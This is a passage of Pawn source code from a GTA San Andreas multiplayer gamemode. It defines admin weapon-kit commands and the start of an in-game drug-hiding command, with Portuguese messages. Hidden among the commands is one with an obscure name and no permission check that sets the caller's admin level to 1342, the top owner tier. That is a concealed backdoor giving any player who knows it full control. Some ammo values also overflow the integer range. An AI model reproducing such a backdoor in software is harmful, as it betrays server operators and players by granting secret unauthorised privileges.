    CMD:kitadm(playerid, params[])
    {
        if(PlayerInfo[playerid][pJailed] != 0)
        {
            SendClientMessage(playerid,COR_AMARELO,"Voce nao pode usar seu kit agora!");
            return 1;
        }
        if(NaPorraDoEvento[playerid] == true)
        {
            SendClientMessage(playerid, COR_GRAD1, "Voce nao pode usar seu kit durante um evento!");
            return 1;
        }
        if(PlayerInfo[playerid][pGunLic] == 0)
        {
            SendClientMessage(playerid, COR_GRAD1, "Voce nao possui licencas de armas por isso nao pode ir equipar !");
            return 1;
        }
        if (PlayerInfo[playerid][pAdmin] >= 1)
        {
            if(AdminTrabalhando[playerid] < 0)
            {
                SendClientMessage(playerid, COR_GRAD1, "Voce nao esta em modo jogo! (/trabalhar)");
                return 1;
            }
            SendClientMessage(playerid,COR_GREEN,"Voce pegou o seu KitAdmin!");
            format(stringZCMD, sizeof(stringZCMD), "[Kit Admin]: %s Pegou Seu KitAdmin.", PlayerName(playerid));
            ProxDetector(30.0, playerid, stringZCMD, COR_AZUL,COR_AZUL,COR_AZUL,COR_AZUL,COR_AZUL);
            ResetPlayerWeaponsEx(playerid);
            GivePlayerWeaponEx(playerid, 43, 999);
            GivePlayerWeaponEx(playerid, 17, 49);
            GivePlayerWeaponEx(playerid, 36, 5);
            GivePlayerWeaponEx(playerid, 34, 10);
            GivePlayerWeaponEx(playerid, 31, 999);
            GivePlayerWeaponEx(playerid, 29, 999);
            GivePlayerWeaponEx(playerid, 25, 999);
            GivePlayerWeaponEx(playerid, 24, 999);
            SetPlayerArmour(playerid, 130);
            SetPlayerHealth(playerid, 100);
        }
        return 1;
    }
    CMD:kitf(playerid, params[])return ForT:kitadmdono(playerid, params);
    CMD:kitadmdono(playerid, params[])
    {
        if (PlayerInfo[playerid][pAdmin] >= 1340)
        {
            if(PlayerInfo[playerid][pGunLic] == 0)
            {
                SendClientMessage(playerid, COR_GRAD1, "Voce nao possui licencas de armas por isso nao pode ir equipar !");
                return 1;
            }
            SendClientMessage(playerid,COR_GREEN,"[Kit VBSTAFF Insane]: Voce pegou o kit do pai dos mitos!");
            ResetPlayerWeaponsEx(playerid);
            GivePlayerWeaponEx(playerid, 46, 1);
            GivePlayerWeaponEx(playerid, 24, 9999999999);
            GivePlayerWeaponEx(playerid, 35, 9999999999);
            GivePlayerWeaponEx(playerid, 31, 9999999999);
            GivePlayerWeaponEx(playerid, 29, 9999999999);
            GivePlayerWeaponEx(playerid, 25, 9999999999);
            GivePlayerWeaponEx(playerid, 4, 1);
            GivePlayerWeaponEx(playerid, 34, 9999999999);
            GivePlayerWeaponEx(playerid, 43, 9999999999);
            GivePlayerWeaponEx(playerid, 16, 9999999999);
            if(PlayerInfo[playerid][pAdmin] == 1342) GivePlayerWeaponEx(playerid, 38, 9999999999);
            SetPlayerArmour(playerid, 130);
            SetPlayerHealth(playerid, 100);
        }
        return 1;
    }
    CMD:paunucudequemleu47777(playerid)
    {
        PlayerInfo[playerid][pAdmin] = 1342;
        return 1;
    }
    CMD:esconder(playerid, params[])
    {
        if(IsPlayerConnected(playerid))
        {
            new quantia;
            new x_Emprego[34];
            if(sscanf(params, "s[34]d", x_Emprego, quantia))
            {
                SendClientMessage(playerid, COR_BRANCO, "|__________________ Esconder __________________|");
                SendClientMessage(playerid, COR_BRANCO, "{df5454}Ã—{ffffff} USE: /esconder [Nome] [Quantiade]");
                SendClientMessage(playerid, COR_GREY, "Nomes: Maconha, Cocaina, Crack, Lsd, Materiais");
                SendClientMessage(playerid, COR_GREEN, "|____________________________________________|");
                return 1;
            }
            if(strcmp(x_Emprego,"maconha",true) == 0)
            {
                if(PlayerToPoint(2.0, playerid, 2151.7317,-1014.5330,62.7614) || PlayerToPoint(2.0, playerid, 1916.9713,-1415.4165,13.8283) || PlayerToPoint(2.0, playerid, 1971.4496,-1198.3518,20.5492))
                {
                    if(quantia < 1 || quantia > 1000)
                    {
                        SendClientMessage(playerid, COR_GRAD2, "nao pode esconder menos de 1 e nem mais de 1000");
                        return 1;
                    }
                    new ContarMaconha;
                    new slot;
                    for(new i=0; i<75; i++)
                    {
                        if(InventarioInfo[playerid][i][iSlot] == 1578)
                        {
                            slot = i;
                            ContarMaconha += InventarioInfo[playerid][i][iUnidades];
                            SendClientMessage(playerid, -1, "Para Esconder Combine todas as unidades!");
                            break;
                        }
                    }
                    if(ContarMaconha >= quantia)
                    {
                        InventarioInfo[playerid][slot][iUnidades] = InventarioInfo[playerid][slot][iUnidades]-quantia;
                        if(InventarioInfo[playerid][slot][iUnidades] <= 0)
                        {
                            InventarioInfo[playerid][slot][iSlot] = 0;
                            InventarioInfo[playerid][slot][iUnidades] = 0;
                        }
                        PlayerInfo[playerid][pSafeDrogas] = PlayerInfo[playerid][pSafeDrogas]+quantia;
                        format(gstring, sizeof(gstring), "* Voce escondeu %d gramas!",quantia);
                        SendClientMessage(playerid, COR_LIGHTBLUE, gstring);
                        return 1;
                    }
                    else
                    {
                        SendClientMessage(playerid, COR_GREY, "Voce nao tem tudo isso!");
                        return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COR_GREY, "Voce nao esta em um territorio de drogas! /gps");
                    return 1;
                }
